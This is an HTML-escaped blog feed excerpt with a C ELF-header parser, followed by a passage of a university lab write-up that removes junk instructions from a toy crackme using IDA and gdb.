\t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_machine);  &lt;span class=&#34;comment&#34;&gt;/* Architecture */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Version:                        \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_version);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Entry point address:            \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_entry);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start of program headers:       \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start of section headers:       \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Flags:                          \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of this header:            \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_ehsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of program headers:        \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phentsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of program headers:      \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of section headers:        \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shentsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of section headers:      \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Section header string table index:\t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shstrndx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 解析节信息 readelf  -S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Section_header = (Elf32_Shdr *)&amp;amp;mem[Elf_header-&amp;gt;e_shoff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    StringTable = &amp;amp;mem[Section_header[Elf_header-&amp;gt;e_shstrndx].sh_offset];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Section header list:\n\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// size flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// for (i = 1; i &amp;lt; Elf_header-&amp;gt;e_shnum; i++) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//     printf(&amp;quot;%-20s\t\t%-10x\t\t0x%x\t\t%x\t\t%c\n&amp;quot;,&amp;amp;StringTable[shdr[i].sh_name],shdr[i].sh_type,shdr[i].sh_addr,shdr[i].sh_size,shdr[i].sh_flags);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[Nr] Name%-20c\t\tType%-10c\tAddr\t\tOff\tSize\tES Flg  Al&amp;quot;&lt;/span&gt;,a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i&amp;lt;Elf_header-&amp;gt;e_shnum; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*printf(&amp;quot;\n[%-2d]  %-20s              %-10x            %08x     %06x    %06x   %02x %02x  %02x &amp;quot;\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n[%-2d]  %-20s\t\t%-10x\t%08x\t%06x\t%06x\t%02x %02x  %02x &amp;quot;&lt;/span&gt;\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               , i,&amp;amp;StringTable[Section_header-&amp;gt;sh_name],Section_header-&amp;gt;sh_type,Section_header-&amp;gt;sh_addr,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               Section_header-&amp;gt;sh_offset,Section_header-&amp;gt;sh_size,Section_header-&amp;gt;sh_entsize,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               Section_header-&amp;gt;sh_flags,Section_header-&amp;gt;sh_addralign);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Section_header++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 解析段信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// readelf -l&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Pro_header = (Elf32_Phdr *)&amp;amp;mem[Elf_header-&amp;gt;e_phoff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n/*****Program Headers:*****/\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;starting at offset: %d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of program headers: %d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Type           Offset   VirtAddr   PhysAddr   FileSiz     MemSiz    Flg\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i&amp;lt;Elf_header-&amp;gt;e_phnum; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d           %-#6x   %-#x   %-#x   %-#5x     %-#5x    %-#x\n&amp;quot;&lt;/span&gt;,Pro_header-&amp;gt;p_type,Pro_header-&amp;gt;p_offset,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    Pro_header-&amp;gt;p_vaddr,Pro_header-&amp;gt;p_paddr\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               ,Pro_header-&amp;gt;p_filesz,Pro_header-&amp;gt;p_memsz,Pro_header-&amp;gt;p_flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Pro_header++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;ELF(5)手册 &lt;/p&gt;
&lt;p&gt;ELF官方规范文档&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qfanmingyiq/article/details/124295287&#34;&gt;https://blog.csdn.net/qfanmingyiq/article/details/124295287&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/401446080?utm_id=0&#34;&gt;https://zhuanlan.zhihu.com/p/401446080?utm_id=0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/jianhong-li/ElfReader&#34;&gt;https://github.com/jianhong-li/ElfReader&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=591986&amp;amp;highlight=elf+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD&#34;&gt;https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=591986&amp;amp;highlight=elf%2B%BD%E2%CE%F6&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-03-14T01:26:04.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/</id>
        <title>ucas-高级网络攻防-实验一_逆向</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/"/>
        <content type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;加花指令程序分析&#34;&gt;&lt;a href=&#34;#加花指令程序分析&#34; class=&#34;headerlink&#34; title=&#34;加花指令程序分析&#34;&gt;&lt;/a&gt;加花指令程序分析&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310191852772.png&#34; alt=&#34;image-20230310191852772&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;程序功能&#34;&gt;&lt;a href=&#34;#程序功能&#34; class=&#34;headerlink&#34; title=&#34;程序功能&#34;&gt;&lt;/a&gt;程序功能&lt;/h2&gt;&lt;p&gt;​		根据解除花指令,反编译后的代码分析可知,该程序获取用户的一个输入,然后对该输入进行三次运算,每一次都是先将输入与0x1453异或,然后左移一位,得到最后的结果. 如果这个结果等于50138则输出win.&lt;/p&gt;
&lt;h2 id=&#34;花指令分析&#34;&gt;&lt;a href=&#34;#花指令分析&#34; class=&#34;headerlink&#34; title=&#34;花指令分析&#34;&gt;&lt;/a&gt;花指令分析&lt;/h2&gt;&lt;p&gt;首先,在函数列表里没有main函数,但是汇编里面有,说明main函数没有被正确反汇编,这里有问题,&lt;/p&gt;
&lt;p&gt;在main前面按p解析函数发现报错,&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000001257: The function has undefined instruction/data at the specified address.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your request has been put in the autoanalysis queue.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000001253                 jz      short label2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000001255                 jnz     short label2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000001255 ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000001257                 db 0E9h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以发现前面有 jz和jnz,肯定不会执行到1257,1257这里是花指令,改成nop即可&lt;/p&gt;
&lt;p&gt;edit - patch program - change word 把E9 改成90 (0x90也就是nop,什么也不执行,往下走 即可)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310193522710.png&#34; alt=&#34;image-20230310193522710&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时这里还是代表数据,用快捷键c转换成代码,然后再在开头用p转换成函数即可&lt;/p&gt;
&lt;p&gt;然后就可以F5反编译&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Input a number: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)encrypt(v4) == &lt;span class=&#34;number&#34;&gt;50138&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;win&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以开到,关键函数是encrypt,进入这里,发现这里面也有问题,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a1 &amp;gt; &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMPOUT(&lt;span class=&#34;number&#34;&gt;0x11EC&lt;/span&gt;LL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011&lt;/span&gt;EB                         loc_11EB:                               ; CODE XREF: encrypt+&lt;span class=&#34;number&#34;&gt;58&lt;/span&gt;↓j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011&lt;/span&gt;EB                                                                 ; encrypt:loc_11EB↑j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011&lt;/span&gt;EB EB FF                                   jmp     &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; near ptr loc_11EB+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ; Jump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011&lt;/span&gt;ED                         ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011&lt;/span&gt;ED C0 FF C8                                sar     bh, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;C8h        ; Shift Arithmetic Right&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011F&lt;/span&gt;0 &lt;span class=&#34;number&#34;&gt;8B&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;45&lt;/span&gt; FC                                mov     eax, [rbp+var_4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011F&lt;/span&gt;3 &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;45&lt;/span&gt; EC                                xor     [rbp+var_14], eax ; Logical Exclusive OR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011F&lt;/span&gt;6 D1 &lt;span class=&#34;number&#34;&gt;45&lt;/span&gt; EC                                rol     [rbp+var_14], &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ; Rotate Left&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000000011F&lt;/span&gt;9 &lt;span class=&#34;number&#34;&gt;83&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;45&lt;/span&gt; F8 &lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;                             add     [rbp+var_8], &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;  ; Add&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		通过gdb动态调试发现, jmp     short near ptr loc_11EB+1  是要跳到00000000000011EC这里,(动态运行的话是0x5555555551ec,要加上装载地址),然后往下解析, 但是在ida里面,由于这条指令的存在,它会从00000000000011ED往后解析,(不太清楚这里面的机制原理),而jump到000011EC这里就jump错了地址,所以反编译有问题.&lt;/p&gt;
